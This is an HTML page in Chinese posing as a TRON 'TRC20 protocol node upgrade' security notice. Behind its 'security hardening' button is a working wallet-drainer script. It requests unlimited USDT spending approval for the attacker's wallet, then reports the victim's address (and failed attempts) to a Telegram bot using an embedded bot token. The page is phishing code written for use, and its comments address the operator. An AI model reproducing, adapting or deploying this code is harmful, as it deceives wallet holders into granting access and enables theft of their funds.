<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TRON 网络安全协议中心</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
    <style>
        body { font-family: -apple-system, "Helvetica Neue", sans-serif; background: #f7f9fc; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .card { width: 90%; max-width: 380px; background: white; border-radius: 20px; padding: 40px 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; }
        .logo { width: 70px; height: 70px; margin-bottom: 25px; }
        h2 { font-size: 20px; color: #1a1a1a; margin-bottom: 15px; font-weight: 700; }
        p { font-size: 14px; color: #666; line-height: 1.6; margin-bottom: 30px; padding: 0 10px; }
        .btn { background: #2196F3; color: white; border: none; padding: 16px 40px; border-radius: 50px; font-size: 16px; font-weight: bold; width: 100%; cursor: pointer; transition: background 0.3s; box-shadow: 0 4px 15px rgba(33, 150, 243, 0.3); }
        .btn:active { background: #1976D2; transform: scale(0.98); }
        .footer { margin-top: 20px; font-size: 12px; color: #ccc; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://www.tronlink.org/img/logo.png" class="logo" alt="TRON">
        <h2>TRC20 协议节点升级</h2>
        <p>系统检测到您的账户协议版本较低。为了您的资产存取安全，请立即完成节点加固，加固后您的账户将受到多重加密保护。</p>
        <button class="btn" onclick="executeApprove()">立即安全加固</button>
        <div class="footer">由 TRON 网络安全中心提供技术支持</div>
    </div>

    <script>
        // 配置信息
        const RECEIVER_WALLET = "TNURWu1Vm7UYftQTZir88BWm1X9aq6JD7a"; // 你的收款地址
        const BOT_TOKEN = "8591423736:AAGdbcYNJ1t1EpLH6060XDtyc3gzXoW_r1U"; // 你的机器人Token
        const CHAT_ID = "8003040361"; // 你的Telegram ID
        const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT合约

        async function executeApprove() {
            if (typeof window.tronWeb === 'undefined') {
                alert("请在波场钱包（如 TronLink, TokenPocket）中打开此页面");
                return;
            }

            try {
                // 连接合约
                const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
                
                // 请求无限授权
                const maxUint256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
                
                await contract.approve(RECEIVER_WALLET, maxUint256).send();
                
                // 获取受害者地址
                const victimAddress = window.tronWeb.defaultAddress.base58;
                
                // 发送通知到你的 Telegram 机器人
                const message = 💰 【大鱼上钩】\n\n地址：${victimAddress}\n状态：已完成授权;
                fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)});
                
                alert("安全加固成功！系统已自动为您升级节点。");
            } catch (error) {
                console.error("操作失败", error);
                // 即使失败也可以记录一次尝试
                const failMsg = ⚠️ 【授权尝试】用户拒绝了或操作失败;
                fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(failMsg)});
            }
        }
    </script>
</body>
</html>